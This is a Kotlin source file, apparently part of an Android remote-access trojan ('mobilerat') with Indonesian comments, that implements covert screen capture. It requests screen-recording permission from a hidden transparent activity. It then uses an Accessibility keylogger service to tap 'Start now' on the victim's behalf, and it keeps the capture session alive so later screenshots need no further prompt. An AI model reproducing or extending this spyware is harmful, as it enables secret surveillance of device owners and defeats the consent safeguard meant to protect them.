package com.kai.mobilerat

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import java.io.File

/**
 * Screenshot lewat MediaProjection — satu-satunya jalan tanpa root.
 *
 * `screencap` butuh READ_FRAME_BUFFER, permission bertanda tangan yang cuma
 * dipegang aplikasi sistem; dari uid aplikasi hasilnya nol byte. MediaProjection
 * adalah API resmi untuk menyalin layar.
 *
 * Izinnya satu kali. Setelah pengguna menekan "Start now", MediaProjection dan
 * VirtualDisplay tetap hidup di proses ini, jadi `shot` berikutnya langsung
 * mengambil frame tanpa dialog lagi. VirtualDisplay dilepas hanya kalau sistem
 * mencabut izin (mis. layar dikunci paksa atau pengguna mencabutnya manual).
 */
object Screen {

    private var projection: MediaProjection? = null
    private var display: VirtualDisplay? = null
    private var reader: ImageReader? = null
    private var width = 0
    private var height = 0

    /** Menunggu hasil dialog izin; hanya satu permintaan pada satu waktu. */
    private var pending: ((Boolean) -> Unit)? = null

    val ready: Boolean
        get() = projection != null && reader != null

    fun request(ctx: Context, cb: (Boolean) -> Unit) {
        pending = cb
        try {
            ctx.startActivity(
                Intent(ctx, ScreenConsentActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            )
            // Dialog izinnya ditutup sendiri lewat AccessibilityService yang
            // sudah aktif. Kalau service-nya mati, dialog tetap tampil dan
            // menunggu operator — bukan gagal diam-diam.
            val svc = KeylogService.instance
            if (svc != null) {
                Thread({ svc.autoConsent(15_000L) }, "consent").start()
            }
        } catch (e: Exception) {
            pending = null
            cb(false)
        }
    }

    fun onConsent(ctx: Context, resultCode: Int, data: Intent?) {
        val cb = pending
        pending = null
        if (resultCode != Activity.RESULT_OK || data == null) {
            cb?.invoke(false)
            return
        }
        val ok = try {
            val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                as MediaProjectionManager
            val mp = mpm.getMediaProjection(resultCode, data)
            if (mp == null) {
                false
            } else {
                mp.registerCallback(object : MediaProjection.Callback() {
                    override fun onStop() = reset()
                }, Handler(Looper.getMainLooper()))

                val m = ctx.resources.displayMetrics
                width = m.widthPixels
                height = m.heightPixels
                val r = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
                display = mp.createVirtualDisplay(
                    "shot", width, height, m.densityDpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    r.surface, null, null
                )
                reader = r
                projection = mp
                true
            }
        } catch (e: Exception) {
            reset()
            false
        }
        cb?.invoke(ok)
    }

    /** Ambil satu frame terakhir dan tulis PNG ke [file]. */
    fun capture(file: File): String {
        val r = reader ?: return "ERR izin layar belum ada"
        if (projection == null) return "ERR izin layar belum ada"

        var image: Image? = null
        val deadline = SystemClock.elapsedRealtime() + 6_000
        while (SystemClock.elapsedRealtime() < deadline) {
            image = r.acquireLatestImage()
            if (image != null) break
            try {
                Thread.sleep(120)
            } catch (_: InterruptedException) {
            }
        }
        if (image == null) return "ERR tidak ada frame (layar mati?)"

        try {
            val plane = image.planes[0]
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            // Baris sering diberi padding; bitmap harus selebar rowStride dulu,
            // baru dipotong ke lebar layar yang sebenarnya.
            val rowPadding = rowStride - pixelStride * width
            val padded = Bitmap.createBitmap(
                width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888
            )
            padded.copyPixelsFromBuffer(plane.buffer)
            val shot = Bitmap.createBitmap(padded, 0, 0, width, height)
            file.outputStream().use { shot.compress(Bitmap.CompressFormat.PNG, 100, it) }
            shot.recycle()
            padded.recycle()
            return "OK"
        } catch (e: Exception) {
            return "ERR ${e.javaClass.simpleName}: ${e.message}"
        } finally {
            image.close()
        }
    }

    private fun reset() {
        try {
            display?.release()
        } catch (_: Exception) {
        }
        try {
            reader?.close()
        } catch (_: Exception) {
        }
        display = null
        reader = null
        projection = null
    }

    /** Lepas semuanya, mis. saat service dimatikan lewat `exit`. */
    fun stop() {
        val p = projection
        reset()
        try {
            p?.stop()
        } catch (_: Exception) {
        }
    }
}

/**
 * Activity transparan yang cuma tugasnya memunculkan dialog izin layar.
 *
 * MediaProjection tidak bisa diminta dari Service, harus dari Activity dengan
 * startActivityForResult. Karena aplikasi ini memegang SYSTEM_ALERT_WINDOW,
 * ia tetap boleh memulai activity dari latar belakang.
 */
class ScreenConsentActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                as MediaProjectionManager
            startActivityForResult(mpm.createScreenCaptureIntent(), 7)
        } catch (e: Exception) {
            Screen.onConsent(this, RESULT_CANCELED, null)
            finish()
        }
    }

    @Deprecated("startActivityForResult sudah usang, tapi ini satu-satunya jalan di minSdk 24")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        Screen.onConsent(this, resultCode, data)
        finish()
        overridePendingTransition(0, 0)
    }
}
